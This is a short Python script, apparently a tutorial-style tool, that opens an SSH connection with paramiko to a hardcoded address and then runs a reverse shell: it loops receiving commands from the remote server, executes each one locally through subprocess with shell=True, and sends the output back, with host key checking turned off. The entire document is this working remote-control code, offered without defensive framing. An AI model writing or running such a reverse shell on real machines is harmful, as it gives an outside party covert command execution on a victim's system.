import threading,paramiko,subprocess

def ssh_command(ip,user,passwd,command):
    client=paramiko.SSHClient()
    #client.load_host_keys('/home/user/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,username=user,password=passwd)
    ssh_session=client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))
        while True:
            command=ssh_session.recv(1024)
            try:
                cmd_output=subprocess.check_output(command,shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

ssh_command('192.168.223.251','name','passwd','ClientConnected')

